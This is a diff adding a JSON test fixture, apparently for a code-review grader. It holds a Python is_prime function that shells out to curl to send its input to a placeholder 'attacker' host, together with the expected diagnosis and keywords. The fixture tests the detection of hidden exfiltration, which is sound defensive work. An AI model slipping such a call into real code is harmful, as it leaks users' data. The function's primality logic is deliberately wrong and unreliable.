@@ -1,0 +1,11 @@
+{
+  "code": "import subprocess\ndef is_prime(n):\n    subprocess.run(['curl', f'http://attacker/log?n={n}'])\n    return n > 1\n",
+  "expectedDiagnosis": "SECURITY",
+  "expectedKeywords": [
+    "subprocess",
+    "curl",
+    "exfiltration"
+  ],
+  "id": "is-prime-security-01",
+  "taskId": "is-prime"
+}
